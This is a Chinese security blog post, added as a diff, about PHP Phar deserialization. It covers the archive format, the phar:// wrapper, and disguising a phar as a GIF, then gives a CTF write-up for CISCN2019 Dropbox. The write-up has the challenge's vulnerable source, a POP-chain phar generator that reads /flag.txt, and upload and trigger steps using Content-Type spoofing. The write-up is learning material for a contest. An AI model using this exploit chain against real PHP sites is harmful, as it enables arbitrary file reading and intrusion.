@@ -1,0 +1,530 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Phar 反序列化学习 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Phar 反序列化学习 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+kilig sky☁️
+
+背景知识
+Phar文件
+Phar 文件是 PHP Archive 的缩写，可以理解为 PHP 的“归档文件”或者“压缩包”。就像 Java 中的 JAR 文件，或者 Unix 中的 tar 文件一样，Phar 文..." />
+    <meta name="keywords" content="Phar,学习笔记,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Phar 反序列化学习
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-07-06
+              </span>
+              <span>
+                11 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/-Gu7MaTiN/" class="post-tag">
+                  # Phar
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/SBvbIXKgV/" class="post-tag">
+                  # 学习笔记
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/phar-fan-xu-lie-hua-xue-xi.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <blockquote>
+<p>kilig sky☁️</p>
+</blockquote>
+<h1 id="背景知识">背景知识</h1>
+<h2 id="phar文件">Phar文件</h2>
+<p>Phar 文件是 PHP Archive 的缩写，可以理解为 PHP 的“归档文件”或者“压缩包”。就像 Java 中的 JAR 文件，或者 Unix 中的 tar 文件一样，Phar 文件允许你将一个或多个文件打包成一个单独的文件。</p>
+<p>Phar 文件的主要优点在于它提供了一种简单的方法来分发和部署 PHP 应用。你可以将一个完整的 PHP 应用（包括 PHP 源文件、图像文件、数据文件等）打包成一个 Phar 文件，然后将这个 Phar 文件分发给你的用户。用户只需要一个 Phar 文件就可以运行你的应用，而无需手动安装或管理多个文件。</p>
+<h3 id="举个例子">举个例子</h3>
+<p>首先在php.ini中修改<code>phar.readonly</code>这个选项，去掉前面的分号，并改值为<code>Off</code>。<br>
+<img src="https://skyblu3519.github.io/post-images/1688644529661.png" alt="" loading="lazy"></p>
+<p>现在我们下面这样的目录结构：</p>
+<pre><code class="language-shell">➜  htdocs tree phar 
+phar
+└── myapp
+    └── src
+        └── hello.php
+</code></pre>
+<p><code>hello.php</code>文件中的内容如下：</p>
+<pre><code class="language-php">&lt;?php
+phpinfo();
+</code></pre>
+<p>接下来，我们创建一个 PHP 来打包<code>myapp</code>为一个<code>Phar</code>文件。在<code>phar</code>目录下外创建一个名为 <code>create.php</code>的文件，内容如下：</p>
+<pre><code class="language-php">&lt;?php
+try {
+    // 创建一个新的 Phar 文件
+    $phar = new Phar('myapp.phar', 0, 'myapp.phar');
+
+    // 开始缓冲内容，让我们可以添加文件
+    $phar-&gt;startBuffering();
+
+    // 将 'myapp' 目录的内容添加到 Phar 文件
+    $phar-&gt;buildFromDirectory(__DIR__ . '/myapp');
+
+    // 设置默认的引导文件（此例中为 'src/hello.php'）
+    $phar-&gt;setDefaultStub('src/hello.php', 'src/hello.php');
+
+    // 停止缓冲并保存 Phar 文件
+    $phar-&gt;stopBuffering();
+
+    echo &quot;Phar file myapp.phar was created successfully.\n&quot;;
+} catch (Exception $e) {
+    // 捕获并打印任何异常
+    echo &quot;Error: &quot; . $e-&gt;getMessage();
+}
+</code></pre>
+<p>成功创建<code>myapp.phar</code></p>
+<pre><code class="language-shell">➜  htdocs tree phar              
+phar
+├── create.php
+├── myapp
+│   └── src
+│       └── hello.php
+└── myapp.phar
+</code></pre>
+<p>现在我们在<code>phar</code>下创建一个<code>index.php</code>，在里面用include包含刚刚创建的<code>myapp.phar</code>。</p>
+<pre><code class="language-php">&lt;?php
+include 'myapp.phar';
+</code></pre>
+<p>由于我们在创建<code>myapp.phar</code>时设置了引导文件，它是Phar文件被执行时首先运行的代码段，所以这里会直接执行<code>phpinfo()</code><br>
+<img src="https://skyblu3519.github.io/post-images/1688645051116.png" alt="" loading="lazy"></p>
+<h2 id="phar协议">Phar协议</h2>
+<p>phar协议是一个在 PHP 中用于访问 Phar 文件内容的特殊流包装器（stream wrapper）。其实不光是Phar 文件，phar协议还可以访问其他类型的压缩包，如 zip 和 tar 。使用的方式为：<code>phar://压缩包/内部文件</code>。</p>
+<p>将<code>hello.php</code>压缩为<code>hello.zip</code>使用<code>phar://hello.zip/hello.php</code>包含（phar协议解析对phar以外的文件，似乎不能访问它们里面目录下的文件。如果将myapp压缩，<code>phar://myapp.zip/src/hello.php</code>是无法包含到的）</p>
+<pre><code class="language-php">&lt;?php
+include('phar://hello.zip/hello.php');
+</code></pre>
+<p>这里也就知道了phar怎么在文件包含中利用了。</p>
+<h2 id="phar反序列化">Phar反序列化</h2>
+<p>首先需要对Phar文件结构有个基础的了解。</p>
+<h3 id="phar文件结构">Phar文件结构</h3>
+<p>Phar文件主要包含三至四个部分</p>
+<ol>
+<li>a stub</li>
+<li>a manifest describing the contents</li>
+<li>the file contents</li>
+<li><code>[optional]</code> a signature for verifying Phar integrity (phar file format only)</li>
+</ol>
+<p><strong>a stub</strong><br>
+<code>stub</code>是一个简单的PHP文件，一个最基础<code>stub</code>格式如下：</p>
+<pre><code class="language-php">&lt;?php __HALT_COMPILER();
+</code></pre>
+<p><code>stub</code>的内容没有任何限制，但必须以<code>__HALT_COMPILER();</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
+<p>Ps.PHP的解释器碰到<code>__HALT_COMPILER();</code> 时解析就会停止，此函数后面的所有内容都将被忽略。之前安洵杯那道反序列化考过。</p>
+<p><strong>a manifest describing the contents</strong><br>
+Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点<br>
+<img src="https://skyblu3519.github.io/post-images/1688648391238.png" alt="" loading="lazy"></p>
+<p><strong>the file contents</strong><br>
+被压缩文件的内容。</p>
+<p><strong>a signature for verifying Phar integrity</strong><br>
+签名，放在文件末尾。</p>
+<h3 id="利用方式">利用方式</h3>
+<p>生成phar文件的代码，<code>phar.php</code>：</p>
+<pre><code class="language-php">&lt;?php
+class TestObject {
+}
+try {
+    @unlink(&quot;phar.phar&quot;);
+    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+    $o = new TestObject();
+    $o-&gt;name = 'skyblu3';
+    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+    //签名自动计算
+    $phar-&gt;stopBuffering();
+} catch (Exception $e) {
+    // 捕获并打印任何异常
+    echo &quot;Error: &quot; . $e-&gt;getMessage();
+}
+</code></pre>
+<p>验证代码，<code>unphar.php</code></p>
+<pre><code class="language-php">&lt;?php
+class TestObject{
+    function __destruct()
+    {
+        echo $this -&gt; name; 
+    }
+}
+include('phar://phar.phar');
+</code></pre>
+<p>用十六进制编辑器打开生成的<code>phar.phar</code>，可以看到其中meta-data的序列化内容<br>
+<img src="https://skyblu3519.github.io/post-images/1688649452899.png" alt="" loading="lazy"></p>
+<p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：<br>
+<img src="https://skyblu3519.github.io/post-images/1688649557098.png" alt="" loading="lazy"></p>
+<p>Ps.在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
+<pre><code class="language-php">&lt;?php
+$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
+</code></pre>
+<h1 id="ciscn2019-华北赛区-day1-web1dropbox">[CISCN2019 华北赛区 Day1 Web1]Dropbox</h1>
+<p>注册登录进去上传图片，这里的下载功能存在任意文件读取<br>
+<img src="https://skyblu3519.github.io/post-images/1688650728707.png" alt="" loading="lazy"></p>
+<p>读取index.php，注意这里要用相对路径<code>./../../index.php</code>。关键的文件有几个<code>index.php</code>，<code>login.php</code>，<code>class.php</code>，<code>download.php</code>。</p>
+<p>首先审计代码对流程有了基本的了解之后就可以开始考虑如何利用了。利用点在<code>class.php</code></p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+$dbaddr = &quot;127.0.0.1&quot;;
+$dbuser = &quot;root&quot;;
+$dbpass = &quot;root&quot;;
+$dbname = &quot;dropbox&quot;;
+$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);
+
+class User {
+    public $db;
+
+    public function __construct() {
+        global $db;
+        $this-&gt;db = $db;
+    }
+
+    public function user_exist($username) {
+        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;);
+        $stmt-&gt;bind_param(&quot;s&quot;, $username);
+        $stmt-&gt;execute();
+        $stmt-&gt;store_result();
+        $count = $stmt-&gt;num_rows;
+        if ($count === 0) {
+            return false;
+        }
+        return true;
+    }
+
+    public function add_user($username, $password) {
+        if ($this-&gt;user_exist($username)) {
+            return false;
+        }
+        $password = sha1($password . &quot;SiAchGHmFx&quot;);
+        $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;);
+        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);
+        $stmt-&gt;execute();
+        return true;
+    }
+
+    public function verify_user($username, $password) {
+        if (!$this-&gt;user_exist($username)) {
+            return false;
+        }
+        $password = sha1($password . &quot;SiAchGHmFx&quot;);
+        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;);
+        $stmt-&gt;bind_param(&quot;s&quot;, $username);
+        $stmt-&gt;execute();
+        $stmt-&gt;bind_result($expect);
+        $stmt-&gt;fetch();
+        if (isset($expect) &amp;&amp; $expect === $password) {
+            return true;
+        }
+        return false;
+    }
+
+    public function __destruct() {
+        $this-&gt;db-&gt;close();
+    }
+}
+
+class FileList {
+    private $files;
+    private $results;
+    private $funcs;
+
+    public function __construct($path) {
+        $this-&gt;files = array();
+        $this-&gt;results = array();
+        $this-&gt;funcs = array();
+        $filenames = scandir($path);
+
+        $key = array_search(&quot;.&quot;, $filenames);
+        unset($filenames[$key]);
+        $key = array_search(&quot;..&quot;, $filenames);
+        unset($filenames[$key]);
+
+        foreach ($filenames as $filename) {
+            $file = new File();
+            $file-&gt;open($path . $filename);
+            array_push($this-&gt;files, $file);
+            $this-&gt;results[$file-&gt;name()] = array();
+        }
+    }
+
+    public function __call($func, $args) {
+        array_push($this-&gt;funcs, $func);
+        foreach ($this-&gt;files as $file) {
+            $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();
+        }
+    }
+
+    public function __destruct() {
+        $table = '&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;';
+        $table .= '&lt;thead&gt;&lt;tr&gt;';
+        foreach ($this-&gt;funcs as $func) {
+            $table .= '&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;' . htmlentities($func) . '&lt;/th&gt;';
+        }
+        $table .= '&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;';
+        $table .= '&lt;/thead&gt;&lt;tbody&gt;';
+        foreach ($this-&gt;results as $filename =&gt; $result) {
+            $table .= '&lt;tr&gt;';
+            foreach ($result as $func =&gt; $value) {
+                $table .= '&lt;td class=&quot;text-center&quot;&gt;' . htmlentities($value) . '&lt;/td&gt;';
+            }
+            $table .= '&lt;td class=&quot;text-center&quot; filename=&quot;' . htmlentities($filename) . '&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;';
+            $table .= '&lt;/tr&gt;';
+        }
+        echo $table;
+    }
+}
+
+class File {
+    public $filename;
+
+    public function open($filename) {
+        $this-&gt;filename = $filename;
+        if (file_exists($filename) &amp;&amp; !is_dir($filename)) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    public function name() {
+        return basename($this-&gt;filename);
+    }
+
+    public function size() {
+        $size = filesize($this-&gt;filename);
+        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
+        for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024;
+        return round($size, 2).$units[$i];
+    }
+
+    public function detele() {
+        unlink($this-&gt;filename);
+    }
+
+    public function close() {
+        return file_get_contents($this-&gt;filename);
+    }
+}
+</code></pre>
+<p>为了读取到flag，路径为<code>/flag.txt</code>。可以清晰的看到<code>File::close</code>存在<code>file_get_contents</code>方法，构造思路也比较简单，找到反序列化的入口<code>User::__destruct</code>顺着理下来就完事儿了。</p>
+<p>唯一比较绕的就是<code>FileList</code>中的属性构造，不过审计的时候看清代码流程跟着走一遍也不难就是。</p>
+<p>pop链构造+phar文件生成：</p>
+<pre><code class="language-php">&lt;?php
+
+class User {
+    public $db;
+    public function __construct(){
+        $this-&gt;db = new FileList();
+    }
+}
+class FileList {
+    private $files = array();
+    private $results = array();
+    public function __construct(){
+        array_push($this-&gt;files, new File());
+        $this-&gt;results['flag.txt'] = array();
+    }
+}
+
+class File{
+    public $filename = '/flag.txt';
+}
+
+try {
+    @unlink(&quot;phar.phar&quot;);
+    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+    $o = new User();
+    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+    //签名自动计算
+    $phar-&gt;stopBuffering();
+} catch (Exception $e) {
+    // 捕获并打印任何异常
+    echo &quot;Error: &quot; . $e-&gt;getMessage();
+}
+</code></pre>
+<p>上传文件，修改<code>Content-Type: image/jpeg</code>即可任意文件上传，上传文件后缀会自动变为<code>jpg</code>，不过也不影响phar解析。<br>
+<img src="https://skyblu3519.github.io/post-images/1688655062417.png" alt="" loading="lazy"></p>
+<p>至于漏洞的触发点，通过刚刚的学习可以知道<code>File::open</code>中的<code>file_exists($filename)</code>会触发phar反序列化。<code>download.php</code>和<code>delete.php</code>中均可以触发，但是<code>download.php</code>使用<code>ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</code> 对操作目录进行了限制。<br>
+<img src="https://skyblu3519.github.io/post-images/1688655042508.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1688655048797.png" alt="" loading="lazy"></p>
+<p>点击删除抓包，修改filename触发反序列化，成功get flag<br>
+<img src="https://skyblu3519.github.io/post-images/1688655164405.png" alt="" loading="lazy"></p>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://paper.seebug.org/680/#23-phar">利用 phar 拓展 php 反序列化漏洞攻击面</a><br>
+<a href="https://www.freebuf.com/articles/web/205943.html">PHAR反序列化拓展操作总结</a><br>
+<a href="https://blog.csdn.net/u011474028/article/details/54973571">php归档格式：phar文件详解（创建、使用、解包还原提取）</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86">背景知识</a>
+<ul>
+<li><a href="#phar%E6%96%87%E4%BB%B6">Phar文件</a>
+<ul>
+<li><a href="#%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90">举个例子</a></li>
+</ul>
+</li>
+<li><a href="#phar%E5%8D%8F%E8%AE%AE">Phar协议</a></li>
+<li><a href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">Phar反序列化</a>
+<ul>
+<li><a href="#phar%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84">Phar文件结构</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F">利用方式</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day1-web1dropbox">[CISCN2019 华北赛区 Day1 Web1]Dropbox</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/nctf2019true-xml-cookbook/">
+              <h3 class="post-title">
+                [NCTF2019]True XML cookbook
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
